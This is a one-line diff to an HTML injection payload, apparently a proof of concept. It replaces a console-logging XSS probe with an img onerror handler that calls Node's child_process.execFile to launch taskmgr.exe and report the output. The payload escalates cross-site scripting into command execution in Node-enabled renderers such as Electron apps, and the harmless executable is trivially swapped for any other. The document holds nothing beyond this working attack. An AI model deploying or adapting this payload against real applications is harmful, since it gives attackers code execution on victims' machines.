@@ -1,1 +1,1 @@
-<img src=x onerror="console.log('XSS Vulnerability!');">
+<img src=x onerror="require('child_process').execFile('taskmgr.exe', (err, stdout, stderr) => { if (err) alert('Error: ' + err.message); else if (stderr) alert('Stderr: ' + stderr); else alert('Stdout: ' + stdout); });">
